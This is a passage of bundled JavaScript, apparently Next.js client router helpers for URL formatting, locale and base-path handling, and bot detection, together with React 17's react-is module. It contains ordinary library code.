	    pathname = pathname.replace(/[?#]/g, encodeURIComponent);
	    search = search.replace('#', '%23');
	    return `${protocol}${host}${pathname}${search}${hash}`;
	}
	const urlObjectKeys = [
	    'auth',
	    'hash',
	    'host',
	    'hostname',
	    'href',
	    'path',
	    'pathname',
	    'port',
	    'protocol',
	    'query',
	    'search',
	    'slashes', 
	];
	formatUrl.urlObjectKeys = urlObjectKeys;
	function formatWithValidation(url) {
	    if (process.env.NODE_ENV === 'development') {
	        if (url !== null && typeof url === 'object') {
	            Object.keys(url).forEach((key)=>{
	                if (urlObjectKeys.indexOf(key) === -1) {
	                    console.warn(`Unknown key passed via urlObject into url.format: ${key}`);
	                }
	            });
	        }
	    }
	    return formatUrl$1(url);
	}

	
	return formatUrl;
}

var detectDomainLocale$1 = {exports: {}};

var detectDomainLocale = {};

var hasRequiredDetectDomainLocale$1;

function requireDetectDomainLocale$1 () {
	if (hasRequiredDetectDomainLocale$1) return detectDomainLocale;
	hasRequiredDetectDomainLocale$1 = 1;
	Object.defineProperty(detectDomainLocale, "__esModule", {
	    value: true
	});
	detectDomainLocale.detectDomainLocale = detectDomainLocale$1;
	function detectDomainLocale$1(domainItems, hostname, detectedLocale) {
	    let domainItem;
	    if (domainItems) {
	        if (detectedLocale) {
	            detectedLocale = detectedLocale.toLowerCase();
	        }
	        for (const item of domainItems){
	            var ref, ref1;
	            // remove port if present
	            const domainHostname = (ref = item.domain) == null ? void 0 : ref.split(':')[0].toLowerCase();
	            if (hostname === domainHostname || detectedLocale === item.defaultLocale.toLowerCase() || ((ref1 = item.locales) == null ? void 0 : ref1.some((locale)=>locale.toLowerCase() === detectedLocale))) {
	                domainItem = item;
	                break;
	            }
	        }
	    }
	    return domainItem;
	}

	
	return detectDomainLocale;
}

var hasRequiredDetectDomainLocale;

function requireDetectDomainLocale () {
	if (hasRequiredDetectDomainLocale) return detectDomainLocale$1.exports;
	hasRequiredDetectDomainLocale = 1;
	(function (module, exports) {
		Object.defineProperty(exports, "__esModule", {
		    value: true
		});
		exports.detectDomainLocale = void 0;
		const detectDomainLocale = (...args)=>{
		    if (process.env.__NEXT_I18N_SUPPORT) {
		        return requireDetectDomainLocale$1().detectDomainLocale(...args);
		    }
		};
		exports.detectDomainLocale = detectDomainLocale;

		if ((typeof exports.default === 'function' || (typeof exports.default === 'object' && exports.default !== null)) && typeof exports.default.__esModule === 'undefined') {
		  Object.defineProperty(exports.default, '__esModule', { value: true });
		  Object.assign(exports.default, exports);
		  module.exports = exports.default;
		}

		
	} (detectDomainLocale$1, detectDomainLocale$1.exports));
	return detectDomainLocale$1.exports;
}

var addLocale$1 = {exports: {}};

var addLocale = {};

var addPathPrefix = {};

var hasRequiredAddPathPrefix;

function requireAddPathPrefix () {
	if (hasRequiredAddPathPrefix) return addPathPrefix;
	hasRequiredAddPathPrefix = 1;
	Object.defineProperty(addPathPrefix, "__esModule", {
	    value: true
	});
	addPathPrefix.addPathPrefix = addPathPrefix$1;
	var _parsePath = requireParsePath();
	function addPathPrefix$1(path, prefix) {
	    if (!path.startsWith('/') || !prefix) {
	        return path;
	    }
	    const { pathname , query , hash  } = (_parsePath).parsePath(path);
	    return `${prefix}${pathname}${query}${hash}`;
	}

	
	return addPathPrefix;
}

var hasRequiredAddLocale$1;

function requireAddLocale$1 () {
	if (hasRequiredAddLocale$1) return addLocale;
	hasRequiredAddLocale$1 = 1;
	Object.defineProperty(addLocale, "__esModule", {
	    value: true
	});
	addLocale.addLocale = addLocale$1;
	var _addPathPrefix = requireAddPathPrefix();
	var _pathHasPrefix = requirePathHasPrefix();
	function addLocale$1(path, locale, defaultLocale, ignorePrefix) {
	    if (locale && locale !== defaultLocale && (ignorePrefix || !(_pathHasPrefix).pathHasPrefix(path.toLowerCase(), `/${locale.toLowerCase()}`) && !(_pathHasPrefix).pathHasPrefix(path.toLowerCase(), '/api'))) {
	        return (_addPathPrefix).addPathPrefix(path, `/${locale}`);
	    }
	    return path;
	}

	
	return addLocale;
}

var hasRequiredAddLocale;

function requireAddLocale () {
	if (hasRequiredAddLocale) return addLocale$1.exports;
	hasRequiredAddLocale = 1;
	(function (module, exports) {
		Object.defineProperty(exports, "__esModule", {
		    value: true
		});
		exports.addLocale = void 0;
		var _normalizeTrailingSlash = requireNormalizeTrailingSlash();
		const addLocale = (path, ...args)=>{
		    if (process.env.__NEXT_I18N_SUPPORT) {
		        return (_normalizeTrailingSlash).normalizePathTrailingSlash(requireAddLocale$1().addLocale(path, ...args));
		    }
		    return path;
		};
		exports.addLocale = addLocale;

		if ((typeof exports.default === 'function' || (typeof exports.default === 'object' && exports.default !== null)) && typeof exports.default.__esModule === 'undefined') {
		  Object.defineProperty(exports.default, '__esModule', { value: true });
		  Object.assign(exports.default, exports);
		  module.exports = exports.default;
		}

		
	} (addLocale$1, addLocale$1.exports));
	return addLocale$1.exports;
}

var removeLocale = {exports: {}};

var hasRequiredRemoveLocale;

function requireRemoveLocale () {
	if (hasRequiredRemoveLocale) return removeLocale.exports;
	hasRequiredRemoveLocale = 1;
	(function (module, exports) {
		Object.defineProperty(exports, "__esModule", {
		    value: true
		});
		exports.removeLocale = removeLocale;
		var _parsePath = requireParsePath();
		function removeLocale(path, locale) {
		    if (process.env.__NEXT_I18N_SUPPORT) {
		        const { pathname  } = (_parsePath).parsePath(path);
		        const pathLower = pathname.toLowerCase();
		        const localeLower = locale == null ? void 0 : locale.toLowerCase();
		        return locale && (pathLower.startsWith(`/${localeLower}/`) || pathLower === `/${localeLower}`) ? `${pathname.length === locale.length + 1 ? `/` : ``}${path.slice(locale.length + 1)}` : path;
		    }
		    return path;
		}

		if ((typeof exports.default === 'function' || (typeof exports.default === 'object' && exports.default !== null)) && typeof exports.default.__esModule === 'undefined') {
		  Object.defineProperty(exports.default, '__esModule', { value: true });
		  Object.assign(exports.default, exports);
		  module.exports = exports.default;
		}

		
	} (removeLocale, removeLocale.exports));
	return removeLocale.exports;
}

var addBasePath = {exports: {}};

var hasRequiredAddBasePath;

function requireAddBasePath () {
	if (hasRequiredAddBasePath) return addBasePath.exports;
	hasRequiredAddBasePath = 1;
	(function (module, exports) {
		Object.defineProperty(exports, "__esModule", {
		    value: true
		});
		exports.addBasePath = addBasePath;
		var _addPathPrefix = requireAddPathPrefix();
		var _normalizeTrailingSlash = requireNormalizeTrailingSlash();
		const basePath = process.env.__NEXT_ROUTER_BASEPATH || '';
		function addBasePath(path, required) {
		    if (process.env.__NEXT_MANUAL_CLIENT_BASE_PATH) {
		        if (!required) {
		            return path;
		        }
		    }
		    return (_normalizeTrailingSlash).normalizePathTrailingSlash((_addPathPrefix).addPathPrefix(path, basePath));
		}

		if ((typeof exports.default === 'function' || (typeof exports.default === 'object' && exports.default !== null)) && typeof exports.default.__esModule === 'undefined') {
		  Object.defineProperty(exports.default, '__esModule', { value: true });
		  Object.assign(exports.default, exports);
		  module.exports = exports.default;
		}

		
	} (addBasePath, addBasePath.exports));
	return addBasePath.exports;
}

var getNextPathnameInfo = {};

var removePathPrefix = {};

var hasRequiredRemovePathPrefix;

function requireRemovePathPrefix () {
	if (hasRequiredRemovePathPrefix) return removePathPrefix;
	hasRequiredRemovePathPrefix = 1;
	Object.defineProperty(removePathPrefix, "__esModule", {
	    value: true
	});
	removePathPrefix.removePathPrefix = removePathPrefix$1;
	var _pathHasPrefix = requirePathHasPrefix();
	function removePathPrefix$1(path, prefix) {
	    if ((_pathHasPrefix).pathHasPrefix(path, prefix)) {
	        const withoutPrefix = path.slice(prefix.length);
	        return withoutPrefix.startsWith('/') ? withoutPrefix : `/${withoutPrefix}`;
	    }
	    return path;
	}

	
	return removePathPrefix;
}

var hasRequiredGetNextPathnameInfo;

function requireGetNextPathnameInfo () {
	if (hasRequiredGetNextPathnameInfo) return getNextPathnameInfo;
	hasRequiredGetNextPathnameInfo = 1;
	Object.defineProperty(getNextPathnameInfo, "__esModule", {
	    value: true
	});
	getNextPathnameInfo.getNextPathnameInfo = getNextPathnameInfo$1;
	var _normalizeLocalePath = requireNormalizeLocalePath$1();
	var _removePathPrefix = requireRemovePathPrefix();
	var _pathHasPrefix = requirePathHasPrefix();
	function getNextPathnameInfo$1(pathname, options) {
	    var _nextConfig;
	    const { basePath , i18n , trailingSlash  } = (_nextConfig = options.nextConfig) != null ? _nextConfig : {};
	    const info = {
	        pathname: pathname,
	        trailingSlash: pathname !== '/' ? pathname.endsWith('/') : trailingSlash
	    };
	    if (basePath && (_pathHasPrefix).pathHasPrefix(info.pathname, basePath)) {
	        info.pathname = (_removePathPrefix).removePathPrefix(info.pathname, basePath);
	        info.basePath = basePath;
	    }
	    if (options.parseData === true && info.pathname.startsWith('/_next/data/') && info.pathname.endsWith('.json')) {
	        const paths = info.pathname.replace(/^\/_next\/data\//, '').replace(/\.json$/, '').split('/');
	        const buildId = paths[0];
	        info.pathname = paths[1] !== 'index' ? `/${paths.slice(1).join('/')}` : '/';
	        info.buildId = buildId;
	    }
	    if (i18n) {
	        const pathLocale = (_normalizeLocalePath).normalizeLocalePath(info.pathname, i18n.locales);
	        info.locale = pathLocale == null ? void 0 : pathLocale.detectedLocale;
	        info.pathname = (pathLocale == null ? void 0 : pathLocale.pathname) || info.pathname;
	    }
	    return info;
	}

	
	return getNextPathnameInfo;
}

var formatNextPathnameInfo = {};

var addPathSuffix = {};

var hasRequiredAddPathSuffix;

function requireAddPathSuffix () {
	if (hasRequiredAddPathSuffix) return addPathSuffix;
	hasRequiredAddPathSuffix = 1;
	Object.defineProperty(addPathSuffix, "__esModule", {
	    value: true
	});
	addPathSuffix.addPathSuffix = addPathSuffix$1;
	var _parsePath = requireParsePath();
	function addPathSuffix$1(path, suffix) {
	    if (!path.startsWith('/') || !suffix) {
	        return path;
	    }
	    const { pathname , query , hash  } = (_parsePath).parsePath(path);
	    return `${pathname}${suffix}${query}${hash}`;
	}

	
	return addPathSuffix;
}

var hasRequiredFormatNextPathnameInfo;

function requireFormatNextPathnameInfo () {
	if (hasRequiredFormatNextPathnameInfo) return formatNextPathnameInfo;
	hasRequiredFormatNextPathnameInfo = 1;
	Object.defineProperty(formatNextPathnameInfo, "__esModule", {
	    value: true
	});
	formatNextPathnameInfo.formatNextPathnameInfo = formatNextPathnameInfo$1;
	var _removeTrailingSlash = requireRemoveTrailingSlash();
	var _addPathPrefix = requireAddPathPrefix();
	var _addPathSuffix = requireAddPathSuffix();
	var _addLocale = requireAddLocale$1();
	function formatNextPathnameInfo$1(info) {
	    let pathname = (_addLocale).addLocale(info.pathname, info.locale, info.buildId ? undefined : info.defaultLocale, info.ignorePrefix);
	    if (info.buildId) {
	        pathname = (_addPathSuffix).addPathSuffix((_addPathPrefix).addPathPrefix(pathname, `/_next/data/${info.buildId}`), info.pathname === '/' ? 'index.json' : '.json');
	    }
	    pathname = (_addPathPrefix).addPathPrefix(pathname, info.basePath);
	    return info.trailingSlash ? !info.buildId && !pathname.endsWith('/') ? (_addPathSuffix).addPathSuffix(pathname, '/') : pathname : (_removeTrailingSlash).removeTrailingSlash(pathname);
	}

	
	return formatNextPathnameInfo;
}

var compareStates = {};

var hasRequiredCompareStates;

function requireCompareStates () {
	if (hasRequiredCompareStates) return compareStates;
	hasRequiredCompareStates = 1;
	Object.defineProperty(compareStates, "__esModule", {
	    value: true
	});
	compareStates.compareRouterStates = compareRouterStates;
	function compareRouterStates(a, b) {
	    const stateKeys = Object.keys(a);
	    if (stateKeys.length !== Object.keys(b).length) return false;
	    for(let i = stateKeys.length; i--;){
	        const key = stateKeys[i];
	        if (key === 'query') {
	            const queryKeys = Object.keys(a.query);
	            if (queryKeys.length !== Object.keys(b.query).length) {
	                return false;
	            }
	            for(let j = queryKeys.length; j--;){
	                const queryKey = queryKeys[j];
	                if (!b.query.hasOwnProperty(queryKey) || a.query[queryKey] !== b.query[queryKey]) {
	                    return false;
	                }
	            }
	        } else if (!b.hasOwnProperty(key) || a[key] !== b[key]) {
	            return false;
	        }
	    }
	    return true;
	}

	
	return compareStates;
}

var isBot = {};

var hasRequiredIsBot;

function requireIsBot () {
	if (hasRequiredIsBot) return isBot;
	hasRequiredIsBot = 1;
	Object.defineProperty(isBot, "__esModule", {
	    value: true
	});
	isBot.isBot = isBot$1;
	function isBot$1(userAgent) {
	    return /Googlebot|Mediapartners-Google|AdsBot-Google|googleweblight|Storebot-Google|Google-PageRenderer|Bingbot|BingPreview|Slurp|DuckDuckBot|baiduspider|yandex|sogou|LinkedInBot|bitlybot|tumblr|vkShare|quora link preview|facebookexternalhit|facebookcatalog|Twitterbot|applebot|redditbot|Slackbot|Discordbot|WhatsApp|SkypeUriPreview|ia_archiver/i.test(userAgent);
	}

	
	return isBot;
}

var reactIs = {exports: {}};

var reactIs_production_min = {};

/** @license React v17.0.2
 * react-is.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */

var hasRequiredReactIs_production_min;

function requireReactIs_production_min () {
	if (hasRequiredReactIs_production_min) return reactIs_production_min;
	hasRequiredReactIs_production_min = 1;
var b=60103,c=60106,d=60107,e=60108,f=60114,g=60109,h=60110,k=60112,l=60113,m=60120,n=60115,p=60116,q=60121,r=60122,u=60117,v=60129,w=60131;
	if("function"===typeof Symbol&&Symbol.for){var x=Symbol.for;b=x("react.element");c=x("react.portal");d=x("react.fragment");e=x("react.strict_mode");f=x("react.profiler");g=x("react.provider");h=x("react.context");k=x("react.forward_ref");l=x("react.suspense");m=x("react.suspense_list");n=x("react.memo");p=x("react.lazy");q=x("react.block");r=x("react.server.block");u=x("react.fundamental");v=x("react.debug_trace_mode");w=x("react.legacy_hidden");}
	function y(a){if("object"===typeof a&&null!==a){var t=a.$$typeof;switch(t){case b:switch(a=a.type,a){case d:case f:case e:case l:case m:return a;default:switch(a=a&&a.$$typeof,a){case h:case k:case p:case n:case g:return a;default:return t}}case c:return t}}}var z=g,A=b,B=k,C=d,D=p,E=n,F=c,G=f,H=e,I=l;reactIs_production_min.ContextConsumer=h;reactIs_production_min.ContextProvider=z;reactIs_production_min.Element=A;reactIs_production_min.ForwardRef=B;reactIs_production_min.Fragment=C;reactIs_production_min.Lazy=D;reactIs_production_min.Memo=E;reactIs_production_min.Portal=F;reactIs_production_min.Profiler=G;reactIs_production_min.StrictMode=H;
	reactIs_production_min.Suspense=I;reactIs_production_min.isAsyncMode=function(){return  false};reactIs_production_min.isConcurrentMode=function(){return  false};reactIs_production_min.isContextConsumer=function(a){return y(a)===h};reactIs_production_min.isContextProvider=function(a){return y(a)===g};reactIs_production_min.isElement=function(a){return "object"===typeof a&&null!==a&&a.$$typeof===b};reactIs_production_min.isForwardRef=function(a){return y(a)===k};reactIs_production_min.isFragment=function(a){return y(a)===d};reactIs_production_min.isLazy=function(a){return y(a)===p};reactIs_production_min.isMemo=function(a){return y(a)===n};
	reactIs_production_min.isPortal=function(a){return y(a)===c};reactIs_production_min.isProfiler=function(a){return y(a)===f};reactIs_production_min.isStrictMode=function(a){return y(a)===e};reactIs_production_min.isSuspense=function(a){return y(a)===l};reactIs_production_min.isValidElementType=function(a){return "string"===typeof a||"function"===typeof a||a===d||a===f||a===v||a===e||a===l||a===m||a===w||"object"===typeof a&&null!==a&&(a.$$typeof===p||a.$$typeof===n||a.$$typeof===g||a.$$typeof===h||a.$$typeof===k||a.$$typeof===u||a.$$typeof===q||a[0]===r)?true:false};
	reactIs_production_min.typeOf=y;
	return reactIs_production_min;
}

var reactIs_development = {};

/** @license React v17.0.2
 * react-is.development.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */

var hasRequiredReactIs_development;

function requireReactIs_development () {
	if (hasRequiredReactIs_development) return reactIs_development;
	hasRequiredReactIs_development = 1;

	if (process.env.NODE_ENV !== "production") {
	  (function() {

	// ATTENTION
	// When adding new symbols to this file,
	// Please consider also adding to 'react-devtools-shared/src/backend/ReactSymbols'
	// The Symbol used to tag the ReactElement-like types. If there is no native Symbol
	// nor polyfill, then a plain number is used for performance.
	var REACT_ELEMENT_TYPE = 0xeac7;
	var REACT_PORTAL_TYPE = 0xeaca;
	var REACT_FRAGMENT_TYPE = 0xeacb;
	var REACT_STRICT_MODE_TYPE = 0xeacc;
	var REACT_PROFILER_TYPE = 0xead2;
	var REACT_PROVIDER_TYPE = 0xeacd;
	var REACT_CONTEXT_TYPE = 0xeace;
	var REACT_FORWARD_REF_TYPE = 0xead0;
	var REACT_SUSPENSE_TYPE = 0xead1;
	var REACT_SUSPENSE_LIST_TYPE = 0xead8;
	var REACT_MEMO_TYPE = 0xead3;
	var REACT_LAZY_TYPE = 0xead4;
	var REACT_BLOCK_TYPE = 0xead9;
	var REACT_SERVER_BLOCK_TYPE = 0xeada;
	var REACT_FUNDAMENTAL_TYPE = 0xead5;
	var REACT_DEBUG_TRACING_MODE_TYPE = 0xeae1;
	var REACT_LEGACY_HIDDEN_TYPE = 0xeae3;

	if (typeof Symbol === 'function' && Symbol.for) {
	  var symbolFor = Symbol.for;
	  REACT_ELEMENT_TYPE = symbolFor('react.element');
	  REACT_PORTAL_TYPE = symbolFor('react.portal');
	  REACT_FRAGMENT_TYPE = symbolFor('react.fragment');
	  REACT_STRICT_MODE_TYPE = symbolFor('react.strict_mode');
	  REACT_PROFILER_TYPE = symbolFor('react.profiler');
	  REACT_PROVIDER_TYPE = symbolFor('react.provider');
	  REACT_CONTEXT_TYPE = symbolFor('react.context');
	  REACT_FORWARD_REF_TYPE = symbolFor('react.forward_ref');
	  REACT_SUSPENSE_TYPE = symbolFor('react.suspense');
	  REACT_SUSPENSE_LIST_TYPE = symbolFor('react.suspense_list');
	  REACT_MEMO_TYPE = symbolFor('react.memo');
	  REACT_LAZY_TYPE = symbolFor('react.lazy');
	  REACT_BLOCK_TYPE = symbolFor('react.block');
	  REACT_SERVER_BLOCK_TYPE = symbolFor('react.server.block');
	  REACT_FUNDAMENTAL_TYPE = symbolFor('react.fundamental');
	  symbolFor('react.scope');
	  symbolFor('react.opaque.id');
	  REACT_DEBUG_TRACING_MODE_TYPE = symbolFor('react.debug_trace_mode');
	  symbolFor('react.offscreen');
	  REACT_LEGACY_HIDDEN_TYPE = symbolFor('react.legacy_hidden');
	}

	// Filter certain DOM attributes (e.g. src, href) if their values are empty strings.

	var enableScopeAPI = false; // Experimental Create Event Handle API.

	function isValidElementType(type) {
	  if (typeof type === 'string' || typeof type === 'function') {
	    return true;
	  } // Note: typeof might be other than 'symbol' or 'number' (e.g. if it's a polyfill).


	  if (type === REACT_FRAGMENT_TYPE || type === REACT_PROFILER_TYPE || type === REACT_DEBUG_TRACING_MODE_TYPE || type === REACT_STRICT_MODE_TYPE || type === REACT_SUSPENSE_TYPE || type === REACT_SUSPENSE_LIST_TYPE || type === REACT_LEGACY_HIDDEN_TYPE || enableScopeAPI ) {
	    return true;
	  }

	  if (typeof type === 'object' && type !== null) {
	    if (type.$$typeof === REACT_LAZY_TYPE || type.$$typeof === REACT_MEMO_TYPE || type.$$typeof === REACT_PROVIDER_TYPE || type.$$typeof === REACT_CONTEXT_TYPE || type.$$typeof === REACT_FORWARD_REF_TYPE || type.$$typeof === REACT_FUNDAMENTAL_TYPE || type.$$typeof === REACT_BLOCK_TYPE || type[0] === REACT_SERVER_BLOCK_TYPE) {
	      return true;
	    }
	  }

	  return false;
	}

	function typeOf(object) {
	  if (typeof object === 'object' && object !== null) {
	    var $$typeof = object.$$typeof;

	    switch ($$typeof) {
	      case REACT_ELEMENT_TYPE:
	        var type = object.type;

	        switch (type) {
	          case REACT_FRAGMENT_TYPE:
	          case REACT_PROFILER_TYPE:
	          case REACT_STRICT_MODE_TYPE:
	          case REACT_SUSPENSE_TYPE:
	          case REACT_SUSPENSE_LIST_TYPE:
	            return type;

	          default:
	            var $$typeofType = type && type.$$typeof;

	            switch ($$typeofType) {
	              case REACT_CONTEXT_TYPE:
	              case REACT_FORWARD_REF_TYPE:
	              case REACT_LAZY_TYPE:
	              case REACT_MEMO_TYPE:
	              case REACT_PROVIDER_TYPE:
	                return $$typeofType;

	              default:
	                return $$typeof;
	            }

	        }

	      case REACT_PORTAL_TYPE:
	        return $$typeof;
	    }
	  }

	  return undefined;
	}
	var ContextConsumer = REACT_CONTEXT_TYPE;
	var ContextProvider = REACT_PROVIDER_TYPE;
	var Element = REACT_ELEMENT_TYPE;
	var ForwardRef = REACT_FORWARD_REF_TYPE;
	var Fragment = REACT_FRAGMENT_TYPE;
	var Lazy = REACT_LAZY_TYPE;
	var Memo = REACT_MEMO_TYPE;
	var Portal = REACT_PORTAL_TYPE;
	var Profiler = REACT_PROFILER_TYPE;
	var StrictMode = REACT_STRICT_MODE_TYPE;
	var Suspense = REACT_SUSPENSE_TYPE;
	var hasWarnedAboutDeprecatedIsAsyncMode = false;
	var hasWarnedAboutDeprecatedIsConcurrentMode = false; // AsyncMode should be deprecated

	function isAsyncMode(object) {
	  {
	    if (!hasWarnedAboutDeprecatedIsAsyncMode) {
	      hasWarnedAboutDeprecatedIsAsyncMode = true; // Using console['warn'] to evade Babel and ESLint

	      console['warn']('The ReactIs.isAsyncMode() alias has been deprecated, ' + 'and will be removed in React 18+.');
	    }
	  }

	  return false;
	}
	function isConcurrentMode(object) {
	  {
	    if (!hasWarnedAboutDeprecatedIsConcurrentMode) {
	      hasWarnedAboutDeprecatedIsConcurrentMode = true; // Using console['warn'] to evade Babel and ESLint

	      console['warn']('The ReactIs.isConcurrentMode() alias has been deprecated, ' + 'and will be removed in React 18+.');
	    }
	  }

	  return false;
	}
	function isContextConsumer(object) {
	  return typeOf(object) === REACT_CONTEXT_TYPE;
	}
	function isContextProvider(object) {
	  return typeOf(object) === REACT_PROVIDER_TYPE;
	}
	function isElement(object) {
	  return typeof object === 'object' && object !== null && object.$$typeof === REACT_ELEMENT_TYPE;
	}
	function isForwardRef(object) {
	  return typeOf(object) === REACT_FORWARD_REF_TYPE;
	}
	function isFragment(object) {
	  return typeOf(object) === REACT_FRAGMENT_TYPE;
	}
	function isLazy(object) {
	  return typeOf(object) === REACT_LAZY_TYPE;
	}
	function isMemo(object) {
	  return typeOf(object) === REACT_MEMO_TYPE;
	}
	function isPortal(object) {
	  return typeOf(object) === REACT_PORTAL_TYPE;
	}
	function isProfiler(object) {
	  return typeOf(object) === REACT_PROFILER_TYPE;
	}
	function isStrictMode(object) {
	  return typeOf(object) === REACT_STRICT_MODE_TYPE;
	}
	function isSuspense(object) {
	  return typeOf(object) === REACT_SUSPENSE_TYPE;
	}

	reactIs_development.ContextConsumer = ContextConsumer;
	reactIs_development.ContextProvider = ContextProvider;
	reactIs_development.Element = Element;
	reactIs_development.ForwardRef = ForwardRef;
	reactIs_development.Fragment = Fragment;
	reactIs_development.Lazy = Lazy;
	reactIs_development.Memo = Memo;
	reactIs_development.Portal = Portal;
	reactIs_development.Profiler = Profiler;
	reactIs_development.StrictMode = StrictMode;
	reactIs_development.Suspense = Suspense;
	reactIs_development.isAsyncMode = isAsyncMode;
	reactIs_development.isConcurrentMode = isConcurrentMode;
	reactIs_development.isContextConsumer = isContextConsumer;
	reactIs_development.isContextProvider = isContextProvider;
	reactIs_development.isElement = isElement;
	reactIs_development.isForwardRef = isForwardRef;
	reactIs_development.isFragment = isFragment;
	reactIs_development.isLazy = isLazy;
	reactIs_development.isMemo = isMemo;
	reactIs_development.isPortal = isPortal;
	reactIs_development.isProfiler = isProfiler;
	reactIs_development.isStrictMode = isStrictMode;
	reactIs_development.isSuspense = isSuspense;
	reactIs_development.isValidElementType = isValidElementType;
	reactIs_development.typeOf = typeOf;
	  })();
	}
	return reactIs_development;
}

var hasRequiredReactIs;

function requireReactIs () {
	if (hasRequiredReactIs) return reactIs.exports;
	hasRequiredReactIs = 1;

	if (process.env.NODE_ENV === 'production') {
	  reactIs.exports = requireReactIs_production_min();
	} else {
	  reactIs.exports = requireReactIs_development();
	}
	return reactIs.exports;
}

var hasRequiredRouter;

function requireRouter () {
	if (hasRequiredRouter) return router;
	hasRequiredRouter = 1;
	Object.defineProperty(router, "__esModule", {
	    value: true
	});
	router.matchesMiddleware = matchesMiddleware;
	router.isLocalURL = isLocalURL;
	router.interpolateAs = interpolateAs;
	router.resolveHref = resolveHref;
	router.createKey = createKey;
	router.default = void 0;
	var _async_to_generator = /*@__PURE__*/ require_async_to_generator().default;
	var _extends = /*@__PURE__*/ require_extends().default;
	var _interop_require_default = /*@__PURE__*/ require_interop_require_default().default;
	var _interop_require_wildcard = /*@__PURE__*/ require_interop_require_wildcard().default;
	var _normalizeTrailingSlash = requireNormalizeTrailingSlash();
	var _removeTrailingSlash = requireRemoveTrailingSlash();
	var _routeLoader = requireRouteLoader();
	var _script = requireScript();
	var _isError = _interop_require_wildcard(requireIsError());
	var _denormalizePagePath = requireDenormalizePagePath();
	var _normalizeLocalePath = requireNormalizeLocalePath$1();
	var _mitt = _interop_require_default(requireMitt());
	var _utils = requireUtils$1();
	var _isDynamic = requireIsDynamic();
	var _parseRelativeUrl = requireParseRelativeUrl();
	var _querystring = requireQuerystring();
	var _resolveRewrites = _interop_require_default(requireResolveRewrites());
	var _routeMatcher = requireRouteMatcher();
	var _routeRegex = requireRouteRegex();
	var _formatUrl = requireFormatUrl();
	var _detectDomainLocale = requireDetectDomainLocale();
	var _parsePath = requireParsePath();
	var _addLocale = requireAddLocale();
	var _removeLocale = requireRemoveLocale();
	var _removeBasePath = requireRemoveBasePath();
	var _addBasePath = requireAddBasePath();
	var _hasBasePath = requireHasBasePath();
	var _getNextPathnameInfo = requireGetNextPathnameInfo();
	var _formatNextPathnameInfo = requireFormatNextPathnameInfo();
	var _compareStates = requireCompareStates();
	var _isBot = requireIsBot();
	function buildCancellationError() {
	    return Object.assign(new Error('Route Cancelled'), {
	        cancelled: true
	    });
	}
	function matchesMiddleware(options) {
	    return _matchesMiddleware.apply(this, arguments);
	}
	function _matchesMiddleware() {
	    _matchesMiddleware = _async_to_generator(function*(options) {
	        const matchers = yield Promise.resolve(options.router.pageLoader.getMiddleware());
	        if (!matchers) return false;
	        const { pathname: asPathname  } = (_parsePath).parsePath(options.asPath);
	        // remove basePath first since path prefix has to be in the order of `/${basePath}/${locale}`
	        const cleanedAs = (_hasBasePath).hasBasePath(asPathname) ? (_removeBasePath).removeBasePath(asPathname) : asPathname;
	        const asWithBasePathAndLocale = (_addBasePath).addBasePath((_addLocale).addLocale(cleanedAs, options.locale));
	        // Check only path match on client. Matching "has" should be done on server
	        // where we can access more info such as headers, HttpOnly cookie, etc.
	        return matchers.some((m)=>new RegExp(m.regexp).test(asWithBasePathAndLocale));
	    });
	    return _matchesMiddleware.apply(this, arguments);
	}
	function stripOrigin(url) {
	    const origin = (_utils).getLocationOrigin();
	    return url.startsWith(origin) ? url.substring(origin.length) : url;
	}
	function omit(object, keys) {
	    const omitted = {};
	    Object.keys(object).forEach((key)=>{
	        if (!keys.includes(key)) {
	            omitted[key] = object[key];
	        }
	    });
	    return omitted;
	}
	function isLocalURL(url) {
	    // prevent a hydration mismatch on href for url with anchor refs
	    if (!(_utils).isAbsoluteUrl(url)) return true;
	    try {
	        // absolute urls can be local if they are on the same origin
	        const locationOrigin = (0, _utils).getLocationOrigin();
	        const resolved = new URL(url, locationOrigin);
	        return resolved.origin === locationOrigin && (0, _hasBasePath).hasBasePath(resolved.pathname);
	    } catch (_) {
	        return false;
	    }
	}
	function interpolateAs(route, asPathname, query) {
	    let interpolatedRoute = '';
	    const dynamicRegex = (_routeRegex).getRouteRegex(route);
	    const dynamicGroups = dynamicRegex.groups;
	    const dynamicMatches = // Try to match the dynamic route against the asPath
	    (asPathname !== route ? (_routeMatcher).getRouteMatcher(dynamicRegex)(asPathname) : '') || // Fall back to reading the values from the href
	    // TODO: should this take priority; also need to change in the router.
	    query;
	    interpolatedRoute = route;
	    const params = Object.keys(dynamicGroups);
	    if (!params.every((param)=>{
	        let value = dynamicMatches[param] || '';
	        const { repeat , optional  } = dynamicGroups[param];
	        // support single-level catch-all
	        // TODO: more robust handling for user-error (passing `/`)
	        let replaced = `[${repeat ? '...' : ''}${param}]`;
	        if (optional) {
	            replaced = `${!value ? '/' : ''}[${replaced}]`;
	        }
	        if (repeat && !Array.isArray(value)) value = [
	            value
	        ];
	        return (optional || param in dynamicMatches) && // Interpolate group into data URL if present
	        (interpolatedRoute = interpolatedRoute.replace(replaced, repeat ? value.map(// these values should be fully encoded instead of just
	        // path delimiter escaped since they are being inserted
	        // into the URL and we expect URL encoded segments
	        // when parsing dynamic route params
	        (segment)=>encodeURIComponent(segment)).join('/') : encodeURIComponent(value)) || '/');
	    })) {
	        interpolatedRoute = '' // did not satisfy all requirements
	        ;
	    // n.b. We ignore this error because we handle warning for this case in
	    // development in the `<Link>` component directly.
	    }
	    return {
	        params,
	        result: interpolatedRoute
	    };
	}
	function resolveHref(router, href, resolveAs) {
	    // we use a dummy base url for relative urls
	    let base;
	    let urlAsString = typeof href === 'string' ? href : (_formatUrl).formatWithValidation(href);
	    // repeated slashes and backslashes in the URL are considered
	    // invalid and will never match a Next.js page/file
	    const urlProtoMatch = urlAsString.match(/^[a-zA-Z]{1,}:\/\//);
	    const urlAsStringNoProto = urlProtoMatch ? urlAsString.slice(urlProtoMatch[0].length) : urlAsString;
	    const urlParts = urlAsStringNoProto.split('?');
	    if ((urlParts[0] || '').match(/(\/\/|\\)/)) {
	        console.error(`Invalid href passed to next/router: ${urlAsString}, repeated forward-slashes (//) or backslashes \\ are not valid in the href`);
	        const normalizedUrl = (_utils).normalizeRepeatedSlashes(urlAsStringNoProto);
	        urlAsString = (urlProtoMatch ? urlProtoMatch[0] : '') + normalizedUrl;
	    }
